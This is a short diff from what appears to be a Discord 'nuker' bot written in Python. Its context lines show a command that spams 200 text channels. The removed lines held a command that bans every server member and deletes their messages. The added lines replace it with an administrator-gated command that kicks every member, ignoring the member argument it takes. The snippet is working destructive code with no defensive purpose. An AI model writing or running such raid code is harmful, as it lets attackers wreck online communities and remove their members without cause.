@@ -36,15 +36,11 @@ async def create(ctx):
      for i in range(200):
         await ctx.guild.create_text_channel("튀엣")
         
-@client.command()
-async def kick(ctx):
-    await ctx.send("후힛")
-    for member in list(ctx.guild.members):
-      try:
-        await member.ban(reason="헤으응", delete_message_days=7)
-        await ctx.send(f"빠잉 {member.display_name}!")
-      except Exception:
-        pass
+@client.command(aliases=['kick'])
+@commands.has_permissions(administrator=True)
+async def kick(ctx,member : discord.Member, *,reason="웅앵웅"):
+    for member in ctx.guild.members:
+          await member.kick(reason=reason)
         
 
     
